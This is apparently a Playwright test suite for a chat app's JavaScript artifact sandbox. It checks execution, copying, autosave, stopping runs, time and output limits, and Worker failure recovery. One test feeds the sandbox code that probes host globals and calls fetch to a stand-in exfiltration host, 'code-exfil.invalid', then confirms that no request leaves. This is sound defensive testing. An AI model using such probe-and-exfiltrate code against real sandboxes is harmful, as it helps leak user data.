import { expect, test, type Page } from "@playwright/test";
import { installChatBrowserStubs, installCleanAppState } from "./test-setup";

async function openCode(page: Page) {
  await installCleanAppState(page);
  await installChatBrowserStubs(page);
  await page.goto("/chat/mia-hotelier");
  await page.getByTestId("chat-input").fill("/artifact code");
  await page.getByTestId("chat-input").press("Enter");
  const dialog = page.getByRole("dialog", { name: "Artifact workspace" });
  await expect(dialog.getByTestId("artifact-code-preview")).toBeVisible();
  return dialog;
}

test("REF-28 executes real JavaScript, copies code/output, and restores code without automatic execution", async ({ page }) => {
  const dialog = await openCode(page);
  const code = 'const greet = name => `Hello, ${name}!`; console.log(["Mia", "Sam"].map(greet).join(" / ")); 42';
  await dialog.getByLabel("Artifact 내용").fill(code);
  await dialog.getByRole("button", { name: "안전 실행" }).click();
  await expect(dialog.getByTestId("code-output")).toHaveText("Hello, Mia! / Hello, Sam!\n42", { timeout: 20_000 });
  await dialog.getByRole("button", { name: "출력 복사" }).click();
  expect(await page.evaluate(() => (window as typeof window & { __e2eClipboardText?: string }).__e2eClipboardText)).toBe("Hello, Mia! / Hello, Sam!\n42");
  await dialog.getByRole("button", { name: "코드 복사" }).click();
  expect(await page.evaluate(() => (window as typeof window & { __e2eClipboardText?: string }).__e2eClipboardText)).toBe(code);
  await expect(dialog.getByTestId("artifact-autosave-status")).toHaveText("모든 변경사항 저장됨");
  await page.reload();
  await page.getByRole("button", { name: "Artifact 열기" }).click();
  await expect(dialog.getByLabel("Artifact 내용")).toHaveValue(code);
  await expect(dialog.getByTestId("code-output")).toHaveCount(0);
  await dialog.getByRole("button", { name: "안전 실행" }).click();
  await expect(dialog.getByTestId("code-output")).toContainText("Hello, Mia!");
});

test("REF-28 denies host access, displays exceptions, and bounds output and execution", async ({ page }) => {
  const dialog = await openCode(page);
  const editor = dialog.getByLabel("Artifact 내용");
  const run = dialog.getByRole("button", { name: "안전 실행" });
  const requests: string[] = [];
  page.on("request", (request) => { if (request.url().includes("code-exfil.invalid")) requests.push(request.url()); });
  await editor.fill('console.log(typeof window, typeof document, typeof localStorage, typeof process); fetch("https://code-exfil.invalid/test")');
  await run.click();
  await expect(dialog.getByTestId("code-error")).toContainText("fetch", { timeout: 20_000 });
  await expect(dialog.getByTestId("code-output")).toHaveText("undefined undefined undefined undefined");
  expect(requests).toEqual([]);
  await editor.fill('throw new Error("please fix me")');
  await run.click();
  await expect(dialog.getByTestId("code-error")).toContainText("please fix me");
  await editor.fill('for (let i=0; i<200; i++) console.log(i);');
  await run.click();
  await expect(dialog.getByText("출력 제한에 도달해 일부 출력만 표시합니다.")).toBeVisible();
  await editor.fill("while (true) {}");
  await run.click();
  await expect(dialog.getByTestId("code-error")).toContainText("시간 제한", { timeout: 8_000 });
  await expect(editor).toHaveValue("while (true) {}");
  await editor.fill("6 * 7");
  await run.click();
  await expect(dialog.getByTestId("code-output")).toHaveText("42");
  await expect(dialog.getByTestId("code-error")).toHaveCount(0);
});

test("REF-28 can stop execution and discards a run when editing or closing on mobile", async ({ page }, testInfo) => {
  await page.setViewportSize({ width: 360, height: 800 });
  const dialog = await openCode(page);
  const editor = dialog.getByLabel("Artifact 내용");
  await editor.fill("while (true) {}");
  await dialog.getByRole("button", { name: "안전 실행" }).click();
  await dialog.getByRole("button", { name: "실행 중단" }).click();
  await expect(dialog.getByTestId("code-error")).toContainText("중단");
  await dialog.getByRole("button", { name: "안전 실행" }).click();
  await editor.fill("21 * 2");
  await expect(dialog.getByRole("button", { name: "실행 중단" })).toHaveCount(0);
  await dialog.getByRole("button", { name: "안전 실행" }).click();
  await expect(dialog.getByTestId("code-output")).toHaveText("42", { timeout: 20_000 });
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= document.documentElement.clientWidth)).toBe(true);
  await page.screenshot({ path: testInfo.outputPath("code-execution-mobile.png") });
  await editor.fill("while (true) {}");
  await dialog.getByRole("button", { name: "안전 실행" }).click();
  await dialog.getByRole("button", { name: "Artifact 닫기" }).click();
  await expect(dialog).toHaveCount(0);
  await expect(page.getByTestId("chat-input")).toBeEnabled();
});

test("REF-28 preserves code and retries after the Worker environment fails to start", async ({ page }) => {
  const dialog = await openCode(page);
  const editor = dialog.getByLabel("Artifact 내용");
  await editor.fill("8 * 8");
  await page.evaluate(() => {
    const state = window as typeof window & { __originalCodeWorker?: typeof Worker };
    state.__originalCodeWorker = window.Worker;
    Object.defineProperty(window, "Worker", { value: undefined, configurable: true, writable: true });
  });
  await dialog.getByRole("button", { name: "안전 실행" }).click();
  await expect(dialog.getByTestId("code-error")).toContainText("실행 환경을 시작하지 못했어요");
  await expect(editor).toHaveValue("8 * 8");
  await page.evaluate(() => {
    const state = window as typeof window & { __originalCodeWorker?: typeof Worker };
    Object.defineProperty(window, "Worker", { value: state.__originalCodeWorker, configurable: true, writable: true });
  });
  await dialog.getByRole("button", { name: "안전 실행" }).click();
  await expect(dialog.getByTestId("code-output")).toHaveText("64", { timeout: 20_000 });
  await expect(dialog.getByTestId("code-error")).toHaveCount(0);
});
